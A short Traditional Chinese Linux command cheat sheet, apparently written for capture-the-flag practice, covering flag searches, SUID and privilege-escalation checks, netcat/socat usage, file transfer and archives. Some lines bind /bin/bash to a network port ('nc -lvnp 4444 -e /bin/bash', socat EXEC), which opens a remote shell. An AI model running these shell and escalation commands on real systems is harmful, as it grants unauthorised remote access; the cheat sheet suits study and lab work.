# Linux 常用指令

## 檔案操作
```bash
find / -name flag.txt 2>/dev/null
find / -perm -4000 2>/dev/null
grep -r "flag" /var/www/
strings binary | grep -i flag
```

## 網路
```bash
nc -lvnp 4444
nc 192.168.1.100 4444
nc -lvnp 4444 -e /bin/bash

socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

curl http://target.com/flag.txt
wget http://target.com/file.zip
```

## 權限提升檢查
```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ps aux | grep root
netstat -tulpn
```

## Base64
```bash
echo "flag{test}" | base64
echo "ZmxhZ3t0ZXN0fQo=" | base64 -d
```

## 檔案傳輸
```bash
Server: python3 -m http.server 8000
Client: wget http://server:8000/file

Server: nc -lvnp 4444 < file
Client: nc server 4444 > file
```

## 壓縮解壓
```bash
tar -xzvf file.tar.gz
unzip file.zip
7z x file.7z
```

## 程序管理
```bash
ps aux
top
kill -9 <PID>
pgrep firefox
pkill firefox
```
